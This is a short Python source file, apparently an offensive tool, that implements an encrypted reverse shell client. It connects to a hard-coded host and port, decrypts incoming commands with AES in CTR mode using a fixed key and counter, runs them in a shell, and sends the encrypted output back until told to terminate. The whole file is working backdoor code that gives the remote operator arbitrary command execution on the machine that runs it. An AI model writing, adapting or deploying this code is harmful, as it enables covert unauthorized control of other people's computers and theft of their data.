#Python Reverse Shell Client
#Author: Cabrera Uriel

import socket                    
import subprocess                 

from Crypto.Cipher import AES


counter = "H"*16
key = "H"*32



def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message) 
 

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        
    s.connect(('10.10.10.100', 8080))                            
 
    while True:                                                 
        command =  decrypt(s.recv(1024))
        print ' We received: ' +  command
        
        if 'terminate' in command:                 
            s.close()
            break 
        
        else:                                                 
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( encrypt (CMD.stdout.read() ) ) 
            s.send( encrypt (CMD.stderr.read())  ) 

def main ():
    connect()
main()
